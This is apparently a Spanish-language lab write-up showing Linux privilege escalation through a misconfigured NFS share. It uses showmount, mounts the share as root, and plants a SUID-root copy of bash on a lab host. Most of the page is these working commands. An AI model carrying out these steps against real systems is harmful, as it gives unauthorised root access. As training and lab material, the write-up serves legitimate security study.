# NFS

Los vectores de escalada de privilegios no se limitan al acceso interno. Las carpetas compartidas y las interfaces de administración remota como SSH y Telnet también pueden ayudarlo a obtener acceso raíz en el sistema de destino. Algunos casos también requerirán el uso de ambos vectores, por ejemplo, encontrar una clave privada SSH raíz en el sistema de destino y conectarse a través de SSH con privilegios de raíz en lugar de intentar aumentar el nivel de privilegios de su usuario actual.

```shell
showmount -e 10.10.26.250
```

<figure><img src="../../.gitbook/assets/20231008184233.png" alt=""><figcaption></figcaption></figure>

```
karen@ip-10-10-26-250:/tmp$ cp /bin/bash .
```

```shell
❯ sudo mount -t nfs 10.10.26.250:/tmp /tmp/share
❯ cd /tmp/share
❯ sudo chown root.root bash
❯ sudo chmod +s bash
❯ chmod +x bash
```

<figure><img src="../../.gitbook/assets/20231008190304.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/20231008191113.png" alt=""><figcaption></figcaption></figure>

### Referencias

* [https://steflan-security.com/linux-privilege-escalation-exploiting-nfs-shares/](https://steflan-security.com/linux-privilege-escalation-exploiting-nfs-shares/)
* [https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/](https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/)
